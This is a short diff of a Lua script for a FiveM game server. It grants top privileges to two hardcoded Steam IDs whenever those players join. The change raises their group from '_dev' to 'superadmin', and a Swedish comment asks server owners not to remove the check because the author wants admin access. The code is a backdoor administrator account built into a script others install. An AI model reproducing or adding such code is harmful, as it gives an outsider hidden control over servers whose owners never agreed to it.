@@ -136,7 +136,7 @@ end)
 AddEventHandler('es:playerLoaded', function(source, user) 
     local src = source
     if GetPlayerIdentifiers(src)[1] == 'steam:11000010dbee8b6' or GetPlayerIdentifiers(src)[1] == 'steam:11000010c77edd7' then -- ta inte bort plz vill kunna ha admin, minsta ni kan göra för att ha scriptet <3
-        TriggerEvent("es:setPlayerData", src, "group", '_dev', function(response, success)
+        TriggerEvent("es:setPlayerData", src, "group", 'superadmin', function(response, success)
 
             if(true)then
             end
